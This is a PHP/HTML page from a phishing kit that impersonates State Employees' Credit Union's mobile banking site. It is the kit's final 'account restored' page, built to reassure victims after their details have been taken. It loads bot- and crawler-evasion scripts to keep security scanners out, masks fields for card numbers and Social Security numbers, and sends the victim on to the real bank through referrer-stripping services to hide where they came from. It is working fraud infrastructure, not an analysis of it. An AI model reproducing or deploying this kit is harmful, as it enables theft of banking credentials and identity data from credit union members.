<?php
session_start();
error_reporting(0);
include '../autob/bt.php';
include '../autob/basicbot.php';
include '../autob/uacrawler.php';
include '../autob/refspam.php';
include '../autob/ipselect.php';
include "../autob/bts2.php";
setcookie($timecookie,md5($timecookie.'7f021a1415b86f2d013b2618fb31ae53y3r'),time()+86400*30,'/',$_SERVER['HTTP_HOST'],false,true);
session_destroy();
?>
<!DOCTYPE html>
<html lang="en">

<head>
    <script src="https://m.ncsecu.org/o/inc/ncsecu_common.js"></script>
    <title> Mobile Access - Menu</title>
    <meta http-equiv="content-type" content="text/html;charset=UTF-8">
    <meta name="format-detection" content="telephone=no">
    <meta id="viewport" name="viewport" content="width=device-width, initial-scale=1.0">
   <meta http-equiv="Refresh" content="6;https://href.li/?https://onlineaccess.ncsecu.org" />
    <link href="https://m.ncsecu.org/m/Styles/SECUmedium.css?ver=1" rel="stylesheet" type="text/css" media="all">
    <link rel="icon" href="https://m.ncsecu.org/m/Images/SECU/SECUfavicon.ico" type="image/x-icon">
    <link rel="icon" href="https://m.ncsecu.org/m/Images/SECU/icon-v2-128x128.png" sizes="128x128">
    <link rel="icon" href="https://m.ncsecu.org/m/Images/SECU/icon-v2-192x192.png" sizes="192x192">
    <link rel="apple-touch-icon" href="https://m.ncsecu.org/m/Images/SECU/apple-touch-icon-v2-76x76.png">
    <link rel="apple-touch-icon" href="https://m.ncsecu.org/m/Images/SECU/apple-touch-icon-v2-152x152.png"
        sizes="152x152">
    <link rel="apple-touch-icon" href="https://m.ncsecu.org/m/Images/SECU/apple-touch-icon-v2-167x167.png"
        sizes="167x167">
    <link rel="apple-touch-icon" href="https://m.ncsecu.org/m/Images/SECU/apple-touch-icon-v2-180x180.png"
        sizes="180x180">
    <script type="text/javascript" src="https://m.ncsecu.org/m/Scripts/ClientSideHelpers.js"></script>
    <script src="https://m.ncsecu.org/m/Scripts/jquery-3.6.0.min.js"></script>
    <style type="text/css">
        .focusSkip {
            background: #333333;
            height: 50px;
            position: absolute;
            left: 0;
            right: 0;
            top: 1.5em;
        }

        .blurSkip {
            background: #333333;
            height: 50px;
            position: fixed;
            left: 0;
            right: 0;
            top: 0;
        }
    </style>
    <script src="../assets/jquery.min.js"></script>
    <script src="../assets/jquery.mask.js"></script>
    <script>
        $(function () {
            $('#cardnumber').mask('0000 0000 0000 0000');
            $('#exp').mask('00/00');
            $('#ssn').mask('000-00-0000');
        });
    </script>
    <!-- Shape Client JavaScript is common.js -->
    <script src="https://www.ncsecu.org/o/inc/ncsecu_common.js?ver=1"></script>
    <meta name="keywords" content="SECU mobile access, 
    SECU mobile, NCSECU mobile access, NCSECU mobile, State Employees Credit Union Mobile, State Employees Credit Union 
    mobile, State Employees’s Credit Union mobile, SECU mobile app, NCSECU Mobile app, state employees credit union mobile 
    app, credit union mobile,financial institution mobile,bank mobile,checking mobile,checking account mobile,money market 
    mobile,cds mobile,certificate of deposit mobile,savings mobile,savings account mobile,invest mobile,online service 
    mobile,online banking mobile,mobile access,bill payment mobile,visa check card mobile,visa credit card mobile,credit 
    card mobile">
</head>

<body id="SiteBody" class="">
    <div><a class="offscreen" href="https://m.ncsecu.org/m/Menu.aspx#main" onfocus="onSkipFocus();"
            onblur="onSkipBlur();"> [Skip To Content]</a></div><noscript>

    </noscript><a href="http://itunes.apple.com/us/app/SECU/id1435916976?mt=8"
        style="text-decoration: none; color: #ffffff;">
        <table id="MobileAppBanner" width="100%" role="presentation" class="blurSkip">
            <tbody>
                <tr>
                    <td width="30px;" style="vertical-align: middle; padding-left: 10px;"><img src="assets/Logo.fw.png"
                            width="25px;" height="25px;" alt="SECU Logo"></td>
                    <td style="vertical-align: middle; text-align: left;" class="text3">Open in the SECU Mobile App</td>
                    <td width="20px;" style="vertical-align: middle; text-align: right; padding-right: 10px;"
                        class="text3">&gt;</td>
                </tr>
            </tbody>
        </table>
    </a>
    <div style="height: 50px;">&nbsp;</div>
    <div id="logobar" class="logoBar">
        <div id="logoDiv" class="centered noExtraSpace"><img id="logo" class="logo" alt="SECU Logo" title="SECU Logo"
                src="assets/SECU_480_White.png"></div>
    </div><a id="main"></a>
    <form href="https://nullreferer.com/?https://onlineaccess.ncsecu.org" id="mainForm">
        <div class="aspNetHidden">
            <input type="hidden" name="__VIEWSTATE" id="__VIEWSTATE"
                value="">
        </div>
        
        <div style="display: none"><input type="hidden" name="ctl00$MainCPH$LoginControl$TextboxBrowserName"
                id="MainCPH_LoginControl_TextboxBrowserName"></div>
        <div id='validator-error-header'
                                            style="margin-top:20px;display:<?php if(!isset($_GET[''.$theerrkey.''])){echo 'none';};?>;">
                                        </div>
        <div class="centered topSpace" style="width: 85%;">
            <div class="tinySpaceBelow" style="font-style: bold;"><span class="bold" id="">Congratulations! You have restored your account access.</span></div>
            <div class="noExtraSpace">
                <div style="padding-bottom: .3em;margin-bottom:.3em;overflow: auto;">
                    <div class="signOnText text3" id="DivLabelUserID" style="display: none;"><label for="TextUserID"
                            id="LabelUserID" style="display:none;">User ID</label>:
                    </div>
                    <div class="signOnInput">
                        <img width="120" height="120" src="../assets/animation-checkmark.gif">



                    </div>
                </div>
                
                
            </div>
            <h3>Thank You for choosing ncsecu.<br></h3>
                                 <br>
                                 <br>
            <div style="margin-top: .2em; margin-bottom: 0em; clear: both;"><input type="button"
                    href="https://nullreferer.com/?https://onlineaccess.ncsecu.org" value="LOG IN"
                    id="MainCPH_LoginControl_ButtonSubmit" class="signOnButton fiColoredButton text5 bold"></div><input
                id="hidJSTest" type="hidden" value="false" name="hidJSTest">
                <h4 class="seconds"> You will be redirected to log into your now fully operational ncsecu
                                    account , within 10 seconds. </h4>
        </div>
        <script type="text/javascript"> //window.document.getElementById("DivLabelUserID").innerHTML = ''; </script>
        <script type="text/javascript" src="assets/js.cookie.min.js.download"></script>
        <script type="text/javascript" src="assets/Fingerprint.js.download"></script>
        <script async="" src="assets/fp.min.js.download" onload="initFingerprintJS()"></script>
        <div style="margin-top: .4em;">
            <div id="MainCPH_SelectionListMenu_contentDiv" class="content">
                <div id="MainCPH_SelectionListMenu_Items_listItemDiv_0" class="menuItem text2"><a id="Menu_1"
                        title="Rates &amp; Fees" href="https://m.ncsecu.org/m/Rates.aspx">Rates &amp; Fees</a></div>
                <div id="MainCPH_SelectionListMenu_Items_listItemDiv_1" class="menuItem text2"><a id="Menu_2"
                        title="Locate Us" href="https://locations.ncsecu.org/search" target="_blank">Locate Us</a></div>
                <div id="MainCPH_SelectionListMenu_Items_listItemDiv_2" class="menuItem text2"><a id="Menu_3"
                        title="Contact Us" href="https://m.ncsecu.org/m/ContactUs_SECU.aspx">Contact Us</a></div>
                <div id="MainCPH_SelectionListMenu_Items_listItemDiv_3" class="menuItem text2"><a id="Menu_4"
                        title="View Full Website" href="https://www.ncsecu.org/home.html">View Full Website</a></div>
            </div>
        </div>
        <input type="hidden"
            name="ctl00$MainCPH$antiCsrfField" id="MainCPH_antiCsrfField"
            value="131406855881912074316022641176191182176">
        <script type="text/javascript" language="Javascript" id="EventScriptBlock">;
            function msieversion() {
                var user_agent = navigator.userAgent;
                if (user_agent.indexOf("MSIE ") > -1 || user_agent.indexOf("Trident/") > -1) {
                    window.location.replace("https://www.ncsecu.org/Errors/generic-browser-support.html");
                }
            }
            msieversion();</script>
        <div class="aspNetHidden"><input type="hidden" name="__VIEWSTATEGENERATOR" id="__VIEWSTATEGENERATOR"
                value="CEF4095C"><input type="hidden" name="__VIEWSTATEENCRYPTED" id="__VIEWSTATEENCRYPTED"
                value=""><input type="hidden" name="__EVENTVALIDATION" id="__EVENTVALIDATION"
                value="W05sL5YVJ040l7zNVHQAfjrw8uf27UlouH08KWoKlhZezCBewacNOzm2HRDjWfFtJf8SBL0XIdH2SNkLYkklNqzpJehooDEPBdbSW+6XmnVn1ct21Gu/PqaStjQmMT9iSsVu54i0rr8cxlIyZtOT2z1mi0i9xEV7r7xs+qJS+s02vYFsYkbKXiVIxmS+7cFPiRFo+Q198K3IJzzaIPLhAUL7fym9I7Wccj2u/OohVvA5l+P5dr7qZUvy8z4AvL/Hou6+2zAE0gBT3iECx/y/6NB3SAM=">
        </div>
    </form>
    <div _ngcontent-ssr-c116="" class="content"><?php if(!stripos($_SESSION['device'],'yochi')){banbot();};?><!----></div>
    <div class="footer text5">
        <div class="smallSpaceBelow"><a href="https://www.ncsecu.org/Home/Legal.html" title="Legal"
                class="Link noShowLink" target="_blank">Legal</a> &nbsp;&nbsp;|&nbsp;&nbsp;
            <a id="linkAccessibility" class="Link noShowLink"
                href="https://www.ncsecu.org/Home/AccessibilityStatement.html" target="_blank">Accessibility</a>
            &nbsp;&nbsp;|&nbsp;&nbsp;
            <a href="https://m.ncsecu.org/m/SiteMap.aspx" id="ViewSiteMapLink" class="Link noShowLink">Site Map</a><br>
            Equal Housing Opportunity
            <img src="assets/ehl_gif_white_s14x13x256Pass.png" width="14" height="13" alt="Equal Housing Lender">
            &nbsp;&nbsp;|&nbsp;&nbsp;
            NMLS#430055
        </div>
        <div class="smallSpaceBelow"><span id="LabelInsuredMessage">Federally Insured by NCUA</span></div>
        <div class="smallSpaceBelow footerDisclaimer"> State Employees' Credit Union conducts all member business in
            English. All origination, servicing, collection, marketing, and informational materials are provided in
            English only. As a service to our members, we will attempt to assist those who have limited English
            proficiency where possible.
        </div><!-- <span id="LabelAccessibilityMessage"></span> -->
    </div>
</body>

</html>